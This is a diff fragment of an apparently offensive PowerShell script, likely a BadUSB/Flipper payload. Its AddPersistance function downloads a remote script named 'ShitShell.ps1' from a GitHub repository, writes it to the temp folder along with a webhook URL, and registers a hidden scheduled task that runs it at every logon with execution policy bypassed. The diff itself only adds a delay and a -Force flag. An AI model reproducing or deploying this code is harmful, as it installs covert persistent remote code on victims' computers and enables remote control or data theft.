@@ -88,7 +88,9 @@ function AddPersistance {
     "`$bin = `"$bin`"" | Out-File -Append "$env:TEMP\s.ps1" -Force
     (Invoke-WebRequest "https://raw.githubusercontent.com/Neo0412/FlipperScripts/main/ShitShell.ps1").Content | Out-File -Append "$env:TEMP\s.ps1"
 
-    (Get-Content -Path "$env:TEMP\s.ps1" | Where-Object {$_ -notlike '*$hookUrl = "$hk"*' -and $_ -notlike '*$bin = "$bn"*'}) | Set-Content -Path "$env:TEMP\s.ps1"
+    Start-Sleep 5
+
+    (Get-Content -Path "$env:TEMP\s.ps1" | Where-Object {$_ -notlike '*$hookUrl = "$hk"*' -and $_ -notlike '*$bin = "$bn"*'}) | Set-Content -Path "$env:TEMP\s.ps1" -Force
 
     $TaskTrigger = New-ScheduledTaskTrigger -AtLogOn
     $TaskAction = New-ScheduledTaskAction -Execute "Powershell.exe" -Argument "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File $env:TEMP\s.ps1"
